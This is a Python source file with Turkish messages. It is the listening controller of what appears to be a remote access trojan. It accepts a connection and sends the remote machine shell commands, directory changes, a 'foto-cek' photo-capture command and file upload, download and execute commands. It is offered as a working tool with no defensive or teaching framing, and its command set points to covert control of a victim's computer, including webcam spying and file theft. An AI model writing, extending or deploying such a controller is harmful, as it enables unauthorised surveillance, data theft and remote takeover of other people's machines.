import socket
import subprocess
import os

def start_server(host, port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((host, port))
    server_socket.listen(5)

    print(f"Dinleniyor... ({host}:{port})")

    client_socket, addr = server_socket.accept()
    print(f"{addr} adresinden bağlantı kabul edildi.")

    handle_client(client_socket)

def handle_client(client_socket):
    while True:
        try:
            command = input("komut girin: ")
            client_socket.send(command.encode('utf-8'))

            if command.lower() == 'exit':
                break
            elif command.startswith("cd"):
                ack = client_socket.recv(4096).decode('utf-8')
                print(ack)
            elif command.startswith('foto-cek'):
                ack = client_socket.recv(4096).decode('utf-8')
                print(ack)
            elif command.startswith('dosya-gonder'):
                receive_file(client_socket)
            elif command.startswith('dosya-al'):
                file_name = command.split()[1]
                send_file(client_socket, file_name)

            elif command.startswith('dosya-calistir'):
                file_name = command.split()[1]
                execute_file(file_name)
            else:
                output = client_socket.recv(4096).decode('utf-8')
                print(output)
        except Exception as e:
            print(f"Hata: {e}")
            break

def receive_file(client_socket):
    try:
        file_info = client_socket.recv(4096).decode('utf-8').split()
        
        if len(file_info) == 3:
            file_name = file_info[1]
            file_size = int(file_info[2])

            # Dosya gönderme onayını client'a gönder
            client_socket.send('ok'.encode('utf-8'))

            # Dosya verisini al
            file_data = client_socket.recv(file_size)
            
            with open(file_name, 'wb') as file:
                file.write(file_data)

            print(f"{file_name} dosyası başarıyla alındı.")
        else:
            print("Hatalı dosya bilgisi alındı.")
    except Exception as e:
        print(f"Dosya alma hatası: {e}")

def send_file(client_socket, file_name):
    try:
        with open(file_name, 'rb') as file:
            file_data = file.read()
            file_size = len(file_data)

            # Dosya bilgilerini server'a gönder
            client_socket.send(f'dosya-gonder {file_name} {file_size}'.encode('utf-8'))
            response = client_socket.recv(4096).decode('utf-8')

            if response.lower() == 'ok':
                # Dosya verisini server'a gönder
                client_socket.send(file_data)
                print(f"{file_name} dosyası başarıyla gönderildi.")
            else:
                print("Dosya gönderme başarısız.")
    except Exception as e:
        print(f"Dosya gönderme hatası: {e}")

def execute_file(file_name):
    try:
        subprocess.Popen(['python', file_name], shell=True)
    except Exception as e:
        print(f"Dosya çalıştırma hatası: {e}")

